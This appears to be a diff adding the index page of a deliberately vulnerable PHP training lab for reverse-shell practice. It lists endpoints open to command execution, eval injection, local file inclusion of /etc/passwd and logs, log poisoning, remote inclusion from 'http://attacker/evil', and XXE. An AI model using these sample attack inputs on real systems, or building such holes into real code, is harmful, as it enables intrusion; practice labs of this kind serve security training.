@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PHP Vulnerability Lab</title>
+    <style>
+        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
+        h1 { color: #ff0000; }
+        h2 { color: #ffff00; }
+        a { color: #00ffff; }
+        .vuln { background: #333; padding: 15px; margin: 10px 0; border-left: 4px solid #ff0000; }
+        code { background: #444; padding: 2px 5px; }
+    </style>
+</head>
+<body>
+    <h1>PHP Vulnerability Lab</h1>
+    <p>Welcome to the PHP reverse shell practice environment!</p>
+
+    <h2>Available Vulnerabilities:</h2>
+
+    <div class="vuln">
+        <h3>Command Execution</h3>
+        <a href="/vulnerable/exec.php?cmd=whoami">/vulnerable/exec.php?cmd=whoami</a>
+        <p>Direct command execution via system()</p>
+    </div>
+
+    <div class="vuln">
+        <h3>Eval Injection</h3>
+        <a href="/vulnerable/eval.php?code=phpinfo();">/vulnerable/eval.php?code=phpinfo();</a>
+        <p>Arbitrary PHP code execution via eval()</p>
+    </div>
+
+    <div class="vuln">
+        <h3>Local File Inclusion (LFI)</h3>
+        <a href="/vulnerable/lfi.php?file=../../../etc/passwd">/vulnerable/lfi.php?file=../../../etc/passwd</a>
+        <p>Include local files. Try: /proc/self/environ, /var/log/apache2/access.log</p>
+    </div>
+
+    <div class="vuln">
+        <h3>Log Poisoning Target</h3>
+        <a href="/vulnerable/lfi-log.php">/vulnerable/lfi-log.php</a>
+        <p>Poison logs via User-Agent, then include via LFI</p>
+    </div>
+
+    <div class="vuln">
+        <h3>Remote File Inclusion (RFI)</h3>
+        <a href="/vulnerable/rfi.php?page=index">/vulnerable/rfi.php?page=http://attacker/evil</a>
+        <p>Include remote files (requires allow_url_include=On)</p>
+    </div>
+
+    <div class="vuln">
+        <h3>XXE (XML External Entity)</h3>
+        <p>Send POST request with XXE payload to /vulnerable/xxe.php</p>
+    </div>
+
+    <div class="vuln">
+        <h3>PHPInfo</h3>
+        <a href="/vulnerable/phpinfo.php">/vulnerable/phpinfo.php</a>
+        <p>PHP configuration for reconnaissance</p>
+    </div>
+</body>
+</html>
